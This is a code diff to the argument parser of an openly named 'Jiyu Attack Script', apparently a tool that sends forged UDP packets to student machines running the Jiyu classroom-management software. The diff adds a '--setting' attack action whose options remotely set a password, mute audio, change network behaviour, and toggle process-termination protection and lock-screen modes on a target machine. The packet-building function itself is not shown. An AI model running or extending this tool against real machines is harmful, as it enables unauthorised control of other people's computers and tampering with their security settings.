@@ -25,6 +25,7 @@ try:
         pkg_rename,
         pkg_website,
         pkg_execute,
+        pkg_setting,
         pkg_customize,
     )
 except ImportError:
@@ -38,11 +39,12 @@ except ImportError:
         pkg_rename,
         pkg_website,
         pkg_execute,
+        pkg_setting,
         pkg_customize,
     )
 
 
-if __name__ == "__main__":
+def main_parser():
     parser = argparse.ArgumentParser(
         description="Jiyu Attack Script\n\n"
         "Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n",
@@ -181,6 +183,13 @@ if __name__ == "__main__":
         help="Rename the target machine",
     )
     attack_action.add_argument(
+        "--setting",
+        nargs="*",
+        metavar="<setting-args>",
+        help="Set specific settings on the target machine\n"
+        'Use `Jiyu_udp_attack -t 127.0.0.1 --setting="-h"` for help',
+    )
+    attack_action.add_argument(
         "--hex",
         type=str,
         metavar="<hex_data>",
@@ -192,7 +201,122 @@ if __name__ == "__main__":
         metavar=("<custom_data>", "<args>"),
         help="Custom packet data to send",
     )
+    return parser
 
+
+def setting_parser():
+    """
+    Parser for the --setting argument.
+    This function is currently a placeholder and can be expanded in the future.
+    """
+    parser = argparse.ArgumentParser(
+        description="Specify settings for the target machine",
+        usage='Jiyu_udp_attack <main-args> --setting="[setting-options]"',
+        argument_default=argparse.SUPPRESS,
+    )
+    network = parser.add_argument_group("Network Configuration")
+    network.add_argument(
+        "--network",
+        default=False,
+        action="store_true",
+        help="Configure network settings on the target machine",
+    )
+    network.add_argument(
+        "--transmission_reliability",
+        type=str,
+        metavar="<reliability>",
+        choices=("low", "medium", "high"),
+        default="medium",
+        help="Set the transmission reliability level (default: medium)",
+    )
+    network.add_argument(
+        "--offline-lag-time-detection",
+        type=int,
+        metavar="<time_ms>",
+        default=10,
+        help="Set the offline lag time detection threshold in seconds (default: 10 ms)",
+    )
+
+    audio = parser.add_argument_group("Audio Configuration")
+    audio.add_argument(
+        "--audio",
+        default=False,
+        action="store_true",
+        help="Configure audio settings on the target machine",
+    )
+    audio.add_argument(
+        "--playback-mute",
+        default=False,
+        action="store_true",
+        help="Mute audio playback on the target machine",
+    )
+    audio.add_argument(
+        "--recording-mute",
+        default=False,
+        action="store_true",
+        help="Mute audio recording on the target machine",
+    )
+    audio.add_argument(
+        "--playback-volume",
+        type=int,
+        metavar="<volume>",
+        default=80,
+        help="Set the audio playback volume (default: 80)",
+    )
+    audio.add_argument(
+        "--recording-volume",
+        type=int,
+        metavar="<volume>",
+        default=80,
+        help="Set the audio recording volume (default: 80)",
+    )
+
+    password = parser.add_argument_group("Password Configuration")
+    password.add_argument(
+        "--password",
+        default=False,
+        action="store_true",
+        help="Configure password settings on the target machine",
+    )
+    password.add_argument(
+        "--password-value",
+        type=str,
+        metavar="<password>",
+        default="",
+        help="Set the password for the target machine (default: empty)",
+    )
+
+    other = parser.add_argument_group("Other Settings")
+    other.add_argument(
+        "--preventing-process-termination",
+        type=str,
+        metavar="<mode>",
+        choices=("disable", "enable", "auto"),
+        default="auto",
+        help="Set the process termination prevention mode (default: auto)",
+    )
+    other.add_argument(
+        "--lock-screen-when-maliciously-offline",
+        type=str,
+        metavar="<mode>",
+        choices=("disable", "enable", "auto"),
+        default="auto",
+        help="Set the lock screen mode when maliciously offline (default: auto)",
+    )
+    other.add_argument(
+        "--hide-the-setup-name-button",
+        type=str,
+        metavar="<mode>",
+        choices=("disable", "enable", "auto"),
+        default="auto",
+        help="Set the visibility of the setup name button (default: auto)",
+    )
+
+    return parser
+
+
+if __name__ == "__main__":
+    parser = main_parser()
     args = parser.parse_args()
     teacher_ip = args.teacher_ip
     teacher_port = args.teacher_port
@@ -251,6 +375,10 @@ if __name__ == "__main__":
         elif args.rename:
             name, name_id = args.rename
             payload = pkg_rename(name, int(name_id))
+        elif args.setting is not None:
+            parser2 = setting_parser()
+            setting_args = parser2.parse_args(args.setting)
+            payload = pkg_setting(**dict(setting_args._get_kwargs()))
         elif args.hex:
             payload = binascii.unhexlify(args.hex.replace(" ", ""))
         elif args.pkg:
